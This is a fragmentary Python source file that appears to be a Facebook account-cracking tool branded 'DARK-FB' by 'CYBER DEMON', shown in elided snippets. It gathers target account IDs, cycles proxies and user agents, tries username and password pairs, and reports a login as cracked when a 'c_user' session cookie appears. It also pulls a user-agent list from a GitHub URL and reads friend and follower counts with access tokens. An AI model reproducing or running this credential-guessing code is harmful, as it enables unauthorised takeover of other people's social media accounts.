...
ugen2,ugen,ugen_=[],[],[]
id_ri,idd,id,loop,ok,cp,yyy,apk_me,pass_,method,prox_,opsi_y,url_met,pass_man = [100063716716333],[],[],0,[],[],"AKTIF","TIDAK","","",[],"DOWN","",""
...
▒█▄▄▀ ▒█░▒█ ▒█░▒█ ▒█░▒█ ░░ ▒█░░░ ▒█▄▄█ {II}"""
    ...
    Jewel-Fund"""
		...
		tod=my_rrrrr.add(f"{j}My WhatsApp{i}")
		tod.add(f"{i}wa.me/+2348178406817{i}")
		tod_=my_rrrrr.add(f"{j}Facebook Page(CYBER DEMON){i}")
		tod_.add(f"{i}https://www.facebook.com/profile.php?id=100063716716333{i}")
		tod_.add(f"{i}https://www.facebook.com/profile.php?id=100063716716333{i}")
...
#		elif ki in ["6","06"]:pass
	...
	def public(self):
		...
		hu = input(f'>--{i}Choose option 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
	...
	def _lonte_(self, ml, token, toket):
		...
		todz.add_column("TOTAL FRIENDS", style=I, justify="center")
		todz.add_column("NUMBER OF FOLLOWERS", style=I, justify="center")
...
def check_op(userrz,pwz,ttl,opsi):
	try:
		...
		if "c_user" in ses.cookies:
			...
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}HAPPY THIS ACCOUNT TAP YES😎 {q}({b}Login Via fb Lite/Mbasic{q})")
...
def arprox(): 
  ...
  try: 
    ...
    httpCaht = requests.get("https://raw.githubusercontent.com/CyberDemon404/DARK-FB/main/user.txt").text 
